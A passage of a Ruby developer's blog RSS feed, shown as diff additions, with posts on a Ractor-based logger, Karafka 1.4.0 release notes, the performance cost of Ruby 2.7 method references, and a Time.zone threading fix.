+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2020/10/diffend-ruby-security/">Diffend &#8211; OSS supply chain security and management platform for Ruby</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://mensfeld.pl/2020/10/diffend-ruby-security/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Building a Ractor based logger that will work with non-Ractor compatible code</title>
+		<link>https://mensfeld.pl/2020/09/building-a-ractor-based-logger-that-will-work-with-non-ractor-compatible-code/</link>
+					<comments>https://mensfeld.pl/2020/09/building-a-ractor-based-logger-that-will-work-with-non-ractor-compatible-code/#respond</comments>
+		
+		<dc:creator><![CDATA[Maciej Mensfeld]]></dc:creator>
+		<pubDate>Tue, 29 Sep 2020 10:00:14 +0000</pubDate>
+				<category><![CDATA[Ruby]]></category>
+		<category><![CDATA[Software]]></category>
+		<category><![CDATA[Ruby 3]]></category>
+		<guid isPermaLink="false">https://mensfeld.pl/?p=5022</guid>
+
+					<description><![CDATA[<p>Recently Mike Perham shared a tweet with this comment and a code sample on the Ruby 3.0 Ractors. If this code doesn't work, how could Rails ever work? Ractor seems fundamentally incompatible with many heavily-used Rails APIs. During the weekend I've added support of Ractors in the Diffend.io, a free platform for an OSS supply [&#8230;]</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2020/09/building-a-ractor-based-logger-that-will-work-with-non-ractor-compatible-code/">Building a Ractor based logger that will work with non-Ractor compatible code</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>Recently Mike Perham shared a <a href="https://twitter.com/getajobmike/status/1304187932522156033">tweet</a> with this comment and a code sample on the Ruby 3.0 Ractors.</p>
+<blockquote><p>If this code doesn't work, how could Rails ever work? Ractor seems fundamentally incompatible with many heavily-used Rails APIs.</p></blockquote>
+<pre class="brush: ruby; title: ; notranslate">
+require 'logger'
+
+class Rails
+  def self.logger
+    @logger ||= Logger.new(STDOUT)
+  end
+end
+
+Ractor.new do
+  Rails.logger.info &quot;Hello&quot;
+end.take
+</pre>
+<p>During the weekend I've added support of Ractors in the <a href="https://diffend.io/">Diffend.io</a>, a free platform for an OSS supply chain security and management for Ruby and Rails, so I’m relatively fresh with the topic. Mike’s code illustrates one of the issues developers will face when making their code Ractors compatible.</p>
+<p>When you try to run it, you will end up with an exception:</p>
+<pre class="brush: ruby; title: ; notranslate">
+terminated with exception (report_on_exception is true):
+`take': thrown by remote Ractor. (Ractor::RemoteError)
+`logger': can not access instance variables of classes/modules
+  from non-main Ractors (RuntimeError)
+</pre>
+<p>Is there any way to preserve the <code>Rails#logger</code> API and allow it to be used from any Ractor we want?</p>
+<p>There is!</p>
+<p>So, let's start by explaining why this code cannot work:</p>
+<pre class="brush: ruby; title: ; notranslate">
+  def self.logger
+    @logger ||= Logger.new(STDOUT)
+  end
+</pre>
+<p>There are actually 2 problems with this code, though only one is visible immediately:</p>
+<ol>
+<li>You cannot access instance variables of the shareable objects from Ractors other than the main one.</li>
+<li>You cannot access STDOUT from the non-main Ractor (at least not that way).</li>
+</ol>
+<p>The good news is said between the lines: while we cannot use shareable objects and cannot refer to instance variables, we can preserve the <code>Rails.logger</code> API!</p>
+<pre class="brush: ruby; title: ; notranslate">
+class Rails
+  def self.logger
+    rand
+  end
+end
+
+Ractor.new do
+  Rails.logger
+end.take.then { p _1 }
+
+#=&gt; 0.06450369439220172
+</pre>
+<p>But we want to share a logger, right? Well, not exactly. What we want is to be able to use the same API to log pieces of information. And that's the key point here.</p>
+<p>We can bypass all of our problems quickly. We just need a separate Ractor that will run all the logging for our application with a standard logger compatible API.</p>
+<p>What do we need to achieve this? Not much. We need to:</p>
+<ol>
+<li>Create a Ractor that will have the one and only application wide logger.</li>
+<li>Create API for logging.</li>
+<li>Connect the Ractor to the <code>Rails#logger</code> interface.</li>
+</ol>
+<p>It all can be achieved with a few lines of code:</p>
+<pre class="brush: ruby; title: ; notranslate">
+class Rogger &lt; Ractor
+  def self.new
+    super do
+      # STDOUT cannot be referenced but $stdout can
+      logger = ::Logger.new($stdout)
+
+      # Run the requested operations on our logger instance
+      while data = recv
+        logger.public_send(data[0], *data[1])
+      end
+    end
+  end
+ 
+  # Really cheap logger API :)
+  def method_missing(m, *args, &amp;_block)
+    self &lt;&lt; [m, *args]
+  end
+end
+
+class Rails
+  LOGGER = Rogger.new
+
+  def self.logger
+    LOGGER
+  end
+end
+
+Ractor.new do
+  Rails.logger.info &quot;Hello&quot;
+end
+</pre>
+<p>and when we run it, we end up with a different challenge:</p>
+<pre class="brush: ruby; title: ; notranslate">
+terminated with exception (report_on_exception is true):
+ruby/3.0.0/logger/formatter.rb:15:in `call': can not access global variables $$ from non-main Ractors (RuntimeError)
+  from ruby/3.0.0/logger.rb:586:in `format_message'
+  from ruby/3.0.0/logger.rb:476:in `add'
+  from ruby/3.0.0/logger.rb:529:in `info'
+  from test.rb:23:in `public_send'
+  from test.rb:23:in `block in new'
+</pre>
+<p><strong>UPDATE</strong>: The pull request that I'm talking about below has been merged, so this monkey patch is no longer needed.</p>
+<p>It turns out, the Ruby defaulf logging formatter is not Ractor-friendly. I've opened the <a href="https://github.com/ruby/ruby/pull/3600">pull request</a> to fix this, so once that's merged, the basic Ruby logger formatter will work just fine. For the time being, we will monkey patch it:</p>
+<pre class="brush: ruby; title: ; notranslate">
+class Logger::Formatter
+  def call(severity, time, progname, msg)
+    Format % [
+      severity[0..0],
+      format_datetime(time),
+      Process.pid,
+      severity,
+      progname,
+      msg2str(msg)
+    ]
+  end
+end
+</pre>
+<p>With this, we can run our logging from any ractor we want:</p>
+<pre class="brush: ruby; title: ; notranslate">
+require 'logger'
+
+class Logger::Formatter
+  def call(severity, time, progname, msg)
+    Format % [
+      severity[0..0],
+      format_datetime(time),
+      Process.pid,
+      severity,
+      progname,
+      msg2str(msg)
+    ]
+  end
+end
+
+class Rogger &lt; Ractor
+  def self.new
+    super do
+      logger = ::Logger.new($stdout)
+
+      while data = recv
+        logger.public_send(data[0], *data[1])
+      end
+    end
+  end
+
+  def method_missing(m, *args, &amp;_block)
+    self &lt;&lt; [m, *args]
+  end
+end
+
+class Rails
+  LOGGER = Rogger.new
+
+  def self.logger
+    LOGGER
+  end
+end
+
+Ractor.new do
+  Rails.logger.info &quot;Hello&quot;
+end
+
+sleep(1)
+</pre>
+<pre class="brush: bash; title: ; notranslate">
+ruby test.rb
+
+I, [2020-09-28T18:23:56.181512 #11519]  INFO -- : Hello
+</pre>
+<h3>Summary</h3>
+<p>Providing the Ractor support in the things like Rails won't be easy. There are many challenges to tackle, but at the same time, I see it as an excellent opportunity to leverage new Ruby capabilities. It's also a great chance to get away from anti-patterns that are in Ruby and Rails for as long as I can remember. There's a whole new world of engineering that will be much easier to achieve thanks to Ractors.</p>
+<p>This year, I want to also explore the possibility of running homogenous Docker containers with Ruby VM in which I could load balance services running in particular guilds. Theoretically, this could allow for sub-second mitigation of sudden traffic spikes without having many overprovisioned instances.</p>
+<hr/>
+<p>Cover photo by <a href="https://www.flickr.com/photos/davidstanleytravel/50356163682/">David Stanley</a> on Attribution 2.0 Generic (CC BY 2.0) license.</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2020/09/building-a-ractor-based-logger-that-will-work-with-non-ractor-compatible-code/">Building a Ractor based logger that will work with non-Ractor compatible code</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://mensfeld.pl/2020/09/building-a-ractor-based-logger-that-will-work-with-non-ractor-compatible-code/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Karafka framework 1.4.0 Release Notes (Ruby + Kafka)</title>
+		<link>https://mensfeld.pl/2020/09/karafka-framework-1-4-0-release-notes-ruby-kafka/</link>
+					<comments>https://mensfeld.pl/2020/09/karafka-framework-1-4-0-release-notes-ruby-kafka/#respond</comments>
+		
+		<dc:creator><![CDATA[Maciej Mensfeld]]></dc:creator>
+		<pubDate>Sat, 05 Sep 2020 10:09:52 +0000</pubDate>
+				<category><![CDATA[Karafka]]></category>
+		<category><![CDATA[Rails]]></category>
+		<category><![CDATA[Ruby]]></category>
+		<category><![CDATA[Software]]></category>
+		<category><![CDATA[apache kafka]]></category>
+		<category><![CDATA[kafka]]></category>
+		<category><![CDATA[karafka]]></category>
+		<category><![CDATA[karafka framework]]></category>
+		<guid isPermaLink="false">https://mensfeld.pl/?p=4999</guid>
+
+					<description><![CDATA[<p>This release mostly solves problems related to message deserialization and normalizes some of the naming conventions to ease during the upgrade to the upcoming 2.0 version. Note: This release is the last release with ruby-kafka under the hood. We've already started the process of moving to rdkafka-ruby. Note: If you are using Sidekiq-Backend plugin, please [&#8230;]</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2020/09/karafka-framework-1-4-0-release-notes-ruby-kafka/">Karafka framework 1.4.0 Release Notes (Ruby + Kafka)</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>This release mostly solves problems related to message deserialization and normalizes some of the naming conventions to ease during the upgrade to the upcoming <code>2.0</code> version.</p>
+<p><strong>Note</strong>: This release is the last release with <code>ruby-kafka</code> under the hood. We've already started the process of moving to <code>rdkafka-ruby</code>.</p>
+<p><strong>Note</strong>: If you are using <code>Sidekiq-Backend</code> plugin, please make sure that you've processed all the jobs from your Sidekiq queue before upgrading Karafka gems.</p>
+
+<h3>Changes (features, incompatibilities, etc)</h3>
+<h4><code>consumer#metadata</code> is now <code>consumer#batch_metadata</code></h4>
+<p>This change is trivial: if you use batch consuming mode and you use the <code>Consumer#metadata</code> method, replace it with <code>Consumer#batch_metadata</code>.</p>
+<pre class="brush: ruby; title: ; notranslate">
+# Karafka 1.3
+class UsersConsumer &lt; ApplicationConsumer
+  def consume
+    puts metadata
+  end
+end
+
+# Karafka 1.4
+class UsersConsumer &lt; ApplicationConsumer
+  def consume
+    puts batch_metadata
+  end
+end
+</pre>
+<h4>Message metadata available under <code>#metadata</code> method</h4>
+<p>Up to version <code>1.3</code>, all the message metadata would be directly available under the root scope of the <code>params</code> object using both direct method reference as well as with <code>#[]</code> accessor.</p>
+<p>While it felt like "The Rails way", it had several side-effects, amongst which the biggest were the need of having a hash like API, issues with accessing metadata without payload deserialization, and a lack of clear separation between payload and the metadata.</p>
+<p>From now on, you can use the <code>params.metadata</code> object to fetch all the metadata.</p>
+<p><strong>Note:</strong> we've preserved the direct metadata values fetching from the <code>params</code> object to preserve backwards compatibility.</p>
+<pre class="brush: ruby; title: ; notranslate">
+# 1.3
+params['partition'] #=&gt; 0
+params.partition #=&gt; 0
+
+# 1.4
+params['partition'] #=&gt; NoMethodError (undefined method '[]')
+
+# This will work due to backward compatibility
+params.partition #=&gt; 0
+
+# This is the recommended way of accessing metadata
+params.metadata.partition #=&gt; 0
+
+# This will also work as metadata is a struct now
+params.metadata[:partition] #=&gt; 0
+params.metadata['partition'] #=&gt; 0
+</pre>
+<h4>Message metadata access allowed without message deserialization</h4>
+<p>When accessing metadata, the payload is not being deserialized until <code>#payload</code> method is being used.</p>
+<h4>null message support in the default JSON deserializer</h4>
+<p>When the Kafka message payload is <code>null</code> / <code>nil</code>, deserialization won't fail. Support for it was added as some of the Karafka users use log compaction with a <code>nil</code> payload. In case like that, <code>#payload</code> will return <code>nil</code>.</p>
+<h4><code>Karafka::Params::Params</code> no longer inherits from a <code>Hash</code></h4>
+<p><code>Karafka::Params::Params</code> is now just a struct. This change is introduced to normalize the setup, limit the corner cases and simplify the interface only to methods that are really needed.</p>
+<h3>Documentation</h3>
+<p>Our <a href="https://github.com/karafka/karafka/wiki">Wiki</a> has been updated accordingly to the <code>1.4</code> status. Please notify us if you find any incompatibilities.</p>
+<h3>Getting started with Karafka</h3>
+<p>If you want to get started with Kafka and Karafka as fast as possible, then the best idea is to just clone our example repository:</p>
+<pre class="brush: bash; title: ; notranslate">
+git clone https://github.com/karafka/example-app ./example_app
+</pre>
+<p>then, just bundle install all the dependencies:</p>
+<pre class="brush: bash; title: ; notranslate">
+cd ./example_app
+bundle install
+</pre>
+<p>and follow the instructions from the <a href="https://github.com/karafka/example-app/blob/master/README.md">example app Wiki</a>.</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2020/09/karafka-framework-1-4-0-release-notes-ruby-kafka/">Karafka framework 1.4.0 Release Notes (Ruby + Kafka)</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://mensfeld.pl/2020/09/karafka-framework-1-4-0-release-notes-ruby-kafka/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>The hidden cost of the Ruby 2.7 dot-colon method reference usage</title>
+		<link>https://mensfeld.pl/2019/11/the-hidden-cost-of-the-ruby-2-7-dot-colon-method-reference-usage/</link>
+					<comments>https://mensfeld.pl/2019/11/the-hidden-cost-of-the-ruby-2-7-dot-colon-method-reference-usage/#comments</comments>
+		
+		<dc:creator><![CDATA[Maciej Mensfeld]]></dc:creator>
+		<pubDate>Sat, 02 Nov 2019 18:35:47 +0000</pubDate>
+				<category><![CDATA[Ruby]]></category>
+		<category><![CDATA[Software]]></category>
+		<category><![CDATA[Performance]]></category>
+		<category><![CDATA[Ruby 2.7]]></category>
+		<guid isPermaLink="false">https://mensfeld.pl/?p=4921</guid>
+
+					<description><![CDATA[<p>Note: This case is valid also for the "old" #method method usage. The reason why I mention that in the "dot-colon" context, is the fact that due to the syntax sugar addition, this style of coding will surely be used more intensely. Note: This feature has been reverted. See details here: bugs.ruby-lang.org/issues/16275. Note: Benchmarks and [&#8230;]</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2019/11/the-hidden-cost-of-the-ruby-2-7-dot-colon-method-reference-usage/">The hidden cost of the Ruby 2.7 dot-colon method reference usage</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p><strong>Note</strong>: This case is valid also for the "old" <code>#method</code> method usage. The reason why I mention that in the "dot-colon" context, is the fact that due to the syntax sugar addition, this style of coding will surely be used more intensely.</p>
+<p><strong>Note</strong>: This feature has been reverted. See details here: <a href="https://bugs.ruby-lang.org/issues/16275">bugs.ruby-lang.org/issues/16275</a>.</p>
+<p><strong>Note</strong>: Benchmarks and the optimization approach still applies to the <code>#method</code> method usage.</p>
+<hr />
+<p>One of the most interesting for me features of the upcoming Ruby <code>2.7</code> is the <a href="https://bugs.ruby-lang.org/issues/13581">syntax sugar for the method reference</a>. I like using the <code>#method</code> method together with the <code>#then</code> (<code>#yield_self</code>) operator in order to compose several functions in a "pipeline" like fashion. It's particularly useful when you process data streams or build ETL pipelines.</p>
+<p>Here's an example of how you could use it:</p>
+<pre class="brush: ruby; title: ; notranslate">
+class Parse
+  def self.call(string)
+    string.to_f
+  end
+end
+
+class Normalize
+  def self.call(number)
+    number.round
+  end
+end
+
+class Transform
+  def self.call(int)
+    int * 2
+  end
+end
+
+# Simulate a long-running data producing source with batches
+# Builds a lot of stringified floats (each unique)
+stream = Array.new(10_000) do |i|
+  Array.new(100) { |i| &quot;#{i}.#{i}&quot; }
+end
+
+stream.each do |batch|
+  batch
+    .map(&amp;Parse.:call)
+    .map(&amp;Normalize.:call)
+    .map(&amp;Transform.:call)
+end
+</pre>
+<p>It's nice, it's clear, it's short. So what is wrong with it?</p>
+<p>Well, what is wrong is Ruby itself. Each time you reference a method using the <code>#method</code> method, Ruby gives you a new instance of a <code>#Method</code> class. Even when you're fetching the method of the same instance of an object. That's not all! Since we're using the <code>&amp;</code> operator, each of the fetched method references is later on converted into a <code>Proc</code> object using the <code>#to_proc</code> method.</p>
+<pre class="brush: ruby; title: ; notranslate">
+nil.:nil?.object_id #=&gt; 47141222633640
+nil.:nil?.object_id #=&gt; 47141222626280
+nil.:nil?.object_id #=&gt; 47141222541360
+
+# In general
+nil.:nil?.object_id == nil.:nil?.object_id #=&gt; false
+nil.:nil?.to_proc == nil.:nil?.to_proc #=&gt; false
+</pre>
+<p>It means that when you process a lot of data samples, you may spin up a lot of objects and pay a huge performance penalty. Especially when you operate on a per entity basis:</p>
+<pre class="brush: ruby; title: ; notranslate">
+stream.each do |batch|
+  batch.each do |message|
+    message
+      .then(&amp;Parse.:call)
+      .then(&amp;Normalize.:call)
+      .then(&amp;Transform.:call)
+  end
+end
+</pre>
+<p>If you run the same code as above, but in a way like this:</p>
+<pre class="brush: ruby; title: ; notranslate">
+stream.each do |batch|
+  batch.each do |message|
+    Transform.call(
+      Normalize.call(
+        Parse.call(message)
+      )
+    )
+  end
+end
+</pre>
+<p>you end up having <strong>12 million</strong> fewer objects and you will be able to run your code almost <strong>10 times faster</strong>!<br />
+See for yourself:</p>
+<pre class="brush: ruby; title: ; notranslate">
+require 'benchmark/ips'
+
+GC.disable
+
+class Parse
+  def self.call(string)
+    string.to_f
+  end
+end
+
+class Normalize
+  def self.call(number)
+    number.round
+  end
+end
+
+class Transform
+  def self.call(int)
+    int * 2
+  end
+end
+
+# Builds a lot of stringified floats (each unique)
+stream = Array.new(10_000) do |i|
+  Array.new(100) { |i| &quot;#{i}.#{i}&quot; }
+end
+
+Benchmark.ips do |x|
+  x.config(time: 5, warmup: 1)
+
+  x.report('std') do
+    stream.each do |batch|
+      batch.each do |message|
+        Transform.call(
+          Normalize.call(
+            Parse.call(message)
+          )
+        )
+      end
+    end
+  end
+
+  # This case was pointed out by Vladimir Dementyev
+  # See the comments for more details
+  x.report('std-then') do
+    stream.each do |batch|
+      batch.each do |message|
+        message.then do |message|
+          Parse.call(message)
+        end.then do |message|
+          Normalize.call(message)
+        end.then do |message|
+          Transform.call(message)
+        end
+      end
+    end
+  end
+
+  x.report('dot-colon') do
+    stream.each do |batch|
+      batch.each do |message|
+        message
+          .then(&amp;Parse.:call)
+          .then(&amp;Normalize.:call)
+          .then(&amp;Transform.:call)
+      end
+    end
+  end
+
+  x.compare!
+end
+</pre>
+<p>Results:</p>
+<pre class="brush: bash; title: ; notranslate">
+Warming up --------------------------------------
+         std 1.000 i/100ms
+    std-then 1.000 i/100ms
+   dot-colon 1.000 i/100ms
+Calculating -------------------------------------
+         std 6.719 (± 0.0%) i/s - 34.000 in 5.060580s
+    std-then 3.085 (± 0.0%) i/s - 16.000 in 5.187639s
+   dot-colon 0.692 (± 0.0%) i/s -  4.000 in 5.824453s
+
+Comparison:
+         std: 6.7 i/s
+    std-then: 3.1 i/s - 2.18x  slower
+   dot-colon: 0.7 i/s - 9.70x  slower
+</pre>
+<p><a href="https://mensfeld.pl/wp-content/uploads/2019/11/Zrzut-ekranu-z-2019-11-11-11-38-18.png" rel="lightbox[4921]"><img decoding="async" loading="lazy" src="https://mensfeld.pl/wp-content/uploads/2019/11/Zrzut-ekranu-z-2019-11-11-11-38-18.png" alt="" width="594" height="364" class="aligncenter size-full wp-image-4976" srcset="https://mensfeld.pl/wp-content/uploads/2019/11/Zrzut-ekranu-z-2019-11-11-11-38-18.png 594w, https://mensfeld.pl/wp-content/uploads/2019/11/Zrzut-ekranu-z-2019-11-11-11-38-18-300x184.png 300w" sizes="(max-width: 594px) 100vw, 594px" /></a></p>
+<p>Same for the allocation of the objects:</p>
+<pre class="brush: ruby; title: ; notranslate">
+tao1 =  GC.stat[:total_allocated_objects]
+
+stream.each do |batch|
+  batch.each do |message|
+    Transform.call(
+      Normalize.call(
+        Parse.call(message)
+      )
+    )
+  end
+end
+
+tao2 =  GC.stat[:total_allocated_objects]
+
+stream.each do |batch|
+  batch.each do |message|
+    message.then do |message|
+      Parse.call(message)
+    end.then do |message|
+      Normalize.call(message)
+    end.then do |message|
+      Transform.call(message)
+    end
+  end
+end
+
+tao3 =  GC.stat[:total_allocated_objects]
+
+stream.each do |batch|
+  batch.each do |message|
+    message
+      .then(&amp;Parse.:call)
+      .then(&amp;Normalize.:call)
+      .then(&amp;Transform.:call)
+  end
+end
+
+tao4 =  GC.stat[:total_allocated_objects]
+
+p &quot;Std allocated: #{tao2 - tao1}&quot;
+p &quot;Std-then allocated: #{tao3 - tao2}&quot;
+p &quot;Dot-colon allocated: #{tao4 - tao3}&quot;
+</pre>
+<pre class="brush: bash; title: ; notranslate">
+Std allocated: 1
+Std-then allocated: 2
+Dot-colon allocated: 12000002
+</pre>
+<p><a href="https://mensfeld.pl/wp-content/uploads/2019/11/Zrzut-ekranu-z-2019-11-11-11-42-10.png" rel="lightbox[4921]"><img decoding="async" loading="lazy" src="https://mensfeld.pl/wp-content/uploads/2019/11/Zrzut-ekranu-z-2019-11-11-11-42-10.png" alt="" width="589" height="361" class="aligncenter size-full wp-image-4979" srcset="https://mensfeld.pl/wp-content/uploads/2019/11/Zrzut-ekranu-z-2019-11-11-11-42-10.png 589w, https://mensfeld.pl/wp-content/uploads/2019/11/Zrzut-ekranu-z-2019-11-11-11-42-10-300x184.png 300w" sizes="(max-width: 589px) 100vw, 589px" /></a></p>
+<p>So, shouldn't we use the new feature (and method reference in general) at all? Not exactly. There are two things you need to do if you want to use it and not slow down your application that much.</p>
+<h3>Memoize your method references</h3>
+<p>Instead of fetching the method reference for each of the objects (or batches), fetch it once and re-use:</p>
+<pre class="brush: ruby; title: ; notranslate">
+parse = Parse.:call
+normalize = Normalize.:call
+transform = Transform.:call
+
+stream.each do |batch|
+  batch.each do |message|
+    message
+      .then(&amp;parse)
+      .then(&amp;normalize)
+      .then(&amp;transform)
+  end
+end
+</pre>
+<p>This will save you from creating <strong>3 milions</strong> objects and will make your code <strong>7 times</strong> slower than the base one.</p>
+<h3>Convert the memoized methods into procs</h3>
+<p>Since Ruby will do that for you anyhow (in a loop), why not be smarter and do it for him:</p>
+<pre class="brush: ruby; title: ; notranslate">
+parse = Parse.:call.to_proc
+normalize = Normalize.:call.to_proc
+transform = Transform.:call.to_proc
+
+stream.each do |batch|
+  batch.each do |message|
+    message
+      .then(&amp;parse)
+      .then(&amp;normalize)
+      .then(&amp;transform)
+  end
+end
+</pre>
+<p>This will make the code above only <strong> 2.5 times</strong> slower than the base one (usually it's fine), and at the same time, it will save you almost all out of the <strong> 12 milion</strong> additional objects!</p>
+<h2>Dot-colon and the method reference further development</h2>
+<p>Some of you might know that I've been involved a bit in this feature. I <a href="https://bugs.ruby-lang.org/issues/16103">proposed and submitted</a> a <a href="https://github.com/ruby/ruby/pull/2267">patch</a>, that will make the <code>.:</code> <code>Method</code> object frozen. It may seem like not much, but freezing keeps a window of opportunity for introducing method reference caching in case it would be needed because the method object is immutable.</p>
+<p>This proposal was an aftermath of my discussion with Ko1 and Matz this summer in Bristol. When using the <code>#method</code> method (not the syntax-sugar), due to the backwards compatibility (that I hope will be broken in this case), the <code>Method</code> instance is not frozen. However, the <code>.:</code> will be. It's a rare corner case (why would you even want to mutate an object like that?), but it does create a funny "glitch":</p>
+<pre class="brush: ruby; title: ; notranslate">
+nil.:nil? == nil.method(:nil?) #=&gt; true
+nil.:nil?.frozen? #=&gt; true
+nil.method(:nil?).frozen? #=&gt; false
+</pre>
+<p><strong>Note</strong>: I'm planning to work on adding the last-method cache after the <strong>2.7</strong> is released and after I'm able to statistically justify that the majority of cases are as those presented above.</p>
+<p><a href="https://mensfeld.pl/wp-content/uploads/2019/11/3f2zqb.jpg" rel="lightbox[4921]"><img decoding="async" loading="lazy" src="https://mensfeld.pl/wp-content/uploads/2019/11/3f2zqb.jpg" alt="" width="500" height="500" class="aligncenter size-full wp-image-4963" srcset="https://mensfeld.pl/wp-content/uploads/2019/11/3f2zqb.jpg 500w, https://mensfeld.pl/wp-content/uploads/2019/11/3f2zqb-150x150.jpg 150w, https://mensfeld.pl/wp-content/uploads/2019/11/3f2zqb-300x300.jpg 300w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
+<hr />
+<p>Cover photo by <a href="https://www.flickr.com/photos/sarairachel/7876005292/">Rahel Samanyi</a> on Attribution 2.0 Generic (CC BY 2.0) license.</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2019/11/the-hidden-cost-of-the-ruby-2-7-dot-colon-method-reference-usage/">The hidden cost of the Ruby 2.7 dot-colon method reference usage</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://mensfeld.pl/2019/11/the-hidden-cost-of-the-ruby-2-7-dot-colon-method-reference-usage/feed/</wfw:commentRss>
+			<slash:comments>1</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>NameError: undefined method ‘parse’ for class ‘NilClass’ when doing Time.zone.parse</title>
+		<link>https://mensfeld.pl/2019/10/nameerror-undefined-method-parse-for-class-nilclass-when-doing-time-zone-parse/</link>
+					<comments>https://mensfeld.pl/2019/10/nameerror-undefined-method-parse-for-class-nilclass-when-doing-time-zone-parse/#respond</comments>
+		
+		<dc:creator><![CDATA[Maciej Mensfeld]]></dc:creator>
+		<pubDate>Mon, 21 Oct 2019 18:00:39 +0000</pubDate>
+				<category><![CDATA[Rails]]></category>
+		<category><![CDATA[Ruby]]></category>
+		<category><![CDATA[Thread]]></category>
+		<category><![CDATA[time]]></category>
+		<guid isPermaLink="false">https://mensfeld.pl/?p=4911</guid>
+
+					<description><![CDATA[<p>If you get following error when trying to parse time: it means you've forgotten to set the timezone: Also, keep in mind, that each time you spin up a new thread, it won't have a timezone defined (outside of Rails): In order to fix that, you need to set the time zone in each of [&#8230;]</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2019/10/nameerror-undefined-method-parse-for-class-nilclass-when-doing-time-zone-parse/">NameError: undefined method &#8216;parse&#8217; for class &#8216;NilClass&#8217; when doing Time.zone.parse</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>If you get following error when trying to parse time:</p>
+<pre class="brush: ruby; title: ; notranslate">
+Time.zone.parse('2019-01-01 11:11:11')
+
+Traceback (most recent call last):
+16: from /bundler/friendly_errors.rb:124:in `with_friendly_errors'
+15: from /bundle:30:in `block in &lt;top (required)&gt;'
+14: from /bundler/cli.rb:18:in `start'
+13: from /bundler/vendor/thor/lib/thor/base.rb:466:in `start'
+12: from /bundler/cli.rb:27:in `dispatch'
+11: from /bundler/vendor/thor/lib/thor.rb:387:in `dispatch'
+10: from /bundler/vendor/thor/lib/thor/invocation.rb:126:in `invoke_command'
+9: from /bundler/vendor/thor/lib/thor/command.rb:27:in `run'
+8: from /bundler/cli.rb:465:in `exec'
+7: from /bundler/cli/exec.rb:28:in `run'
+6: from /bundler/cli/exec.rb:74:in `kernel_load'
+5: from /bundler/cli/exec.rb:74:in `load'
+4: from bin/irb:23:in `&lt;top (required)&gt;'
+3: from bin/irb:23:in `load'
+2: from lib/ruby/gems/2.6.0/gems/irb-1.0.0/exe/irb:11:in `&lt;top (required)&gt;'
+1: from (irb):5
+
+NoMethodError (undefined method `parse' for nil:NilClass)
+</pre>
+<p>it means you've forgotten to set the timezone:</p>
+<pre class="brush: ruby; title: ; notranslate">
+Time.zone = 'UTC'
+</pre>
+<p>Also, keep in mind, that each time you spin up a new thread, it won't have a timezone defined (outside of Rails):</p>
+<pre class="brush: ruby; title: ; notranslate">
+Time.zone = 'UTC'
+
+Time.zone.parse('2019-01-01 11:11:11') # works
+
+Thread.abort_on_exception = true
+
+# fails
+Thread.new do
+  Time.zone.parse('2019-01-01 11:11:11')
+end
+
+# NoMethodError: undefined method `parse' for nil:NilClass
+</pre>
+<p>In order to fix that, you need to set the time zone in each of your newly created threads:</p>
+<pre class="brush: ruby; title: ; notranslate">
+Time.zone = 'UTC'
+
+Time.zone.parse('2019-01-01 11:11:11') # works
+
+Thread.abort_on_exception = true
+
+# works
+Thread.new do
+  Time.zone = 'UTC'
+  Time.zone.parse('2019-01-01 11:11:11')
+end
+</pre>
+<p>Cover photo by <a href="https://www.flickr.com/photos/alextheshutter/" rel="noopener noreferrer" target="_blank">Alex The Shutter</a> on Attribution-NonCommercial 2.0 Generic (CC BY-NC 2.0) license.</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2019/10/nameerror-undefined-method-parse-for-class-nilclass-when-doing-time-zone-parse/">NameError: undefined method &#8216;parse&#8217; for class &#8216;NilClass&#8217; when doing Time.zone.parse</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://mensfeld.pl/2019/10/nameerror-undefined-method-parse-for-class-nilclass-when-doing-time-zone-parse/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Karafka framework 1.3.0 Release Notes (Ruby + Kafka)</title>
+		<link>https://mensfeld.pl/2019/09/karafka-framework-1-3-0-release-notes-ruby-kafka/</link>
+					<comments>https://mensfeld.pl/2019/09/karafka-framework-1-3-0-release-notes-ruby-kafka/#respond</comments>
+		
+		<dc:creator><![CDATA[Maciej Mensfeld]]></dc:creator>
+		<pubDate>Mon, 09 Sep 2019 11:43:16 +0000</pubDate>
+				<category><![CDATA[Karafka]]></category>
+		<category><![CDATA[Rails]]></category>
+		<category><![CDATA[Ruby]]></category>
+		<category><![CDATA[Software]]></category>
+		<category><![CDATA[apache kafka]]></category>
+		<category><![CDATA[kafka]]></category>
+		<category><![CDATA[karafka]]></category>
+		<category><![CDATA[karafka framework]]></category>
+		<guid isPermaLink="false">https://mensfeld.pl/?p=4706</guid>
